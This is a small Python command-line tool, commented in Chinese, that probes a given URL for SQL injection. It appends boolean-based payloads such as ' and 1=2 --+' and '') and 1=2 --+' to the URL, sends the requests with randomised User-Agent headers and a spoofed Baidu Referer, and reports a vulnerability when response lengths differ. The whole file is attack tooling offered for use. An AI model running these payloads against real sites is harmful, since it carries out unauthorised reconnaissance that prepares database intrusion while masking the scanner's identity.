import argparse
from User_Agent_random import *
import requests

# python简单的sql注入检测工具
# 准备payload,基本上手工注入的方式准备进行了url编码的payload
payload = ['%20and%201=1%20--+', '%20and%201=2%20--+','%27%20and%201=1%20--+','%27%20and%201=2%20--+',
           '%27)%20and%201=1%20--+','%27)%20and%201=2%20--+','")%20and%201=1%20--+','")%20and%201=2%20--+'
           ]
# 定义一个用来存储结果的序列
result_list = []

# 构建爬虫体
def poc(url):
    ua = UserAgent()
    head = {
        'User-Agent': ua.randoms(),
        'Referer': 'https://www.baidu.com'
    }
    #     进行payload的尝试
    for i in payload:
        res = requests.get(url=url + i, headers=head)
        result_list.append(len(res.text))
        res.close()
    #   进行判断
    if result_list[0] != result_list[1]:
        return r'存在sql注入，payload 为 and 1=2'
    elif result_list[2] != result_list[3]:
        return r"存在sql注入，payload 为 ' and 1=2"
    elif result_list[4] != result_list[5]:
        return r"存在sql注入,payload 为 ') and 1=2"
    elif result_list[6] != result_list[7]:
        return r'存在sql注入，payload为 ") and 1=2'

if __name__ == '__main__':
    # 命令提示符
    parser = argparse.ArgumentParser(description='这是一款用于简单检测sql 的小工具')
    parser.add_argument('-u', help='输入完整的网址比如https://www.baidu.com')
    args = parser.parse_args()
    # 获取网址
    print(poc(args.u))

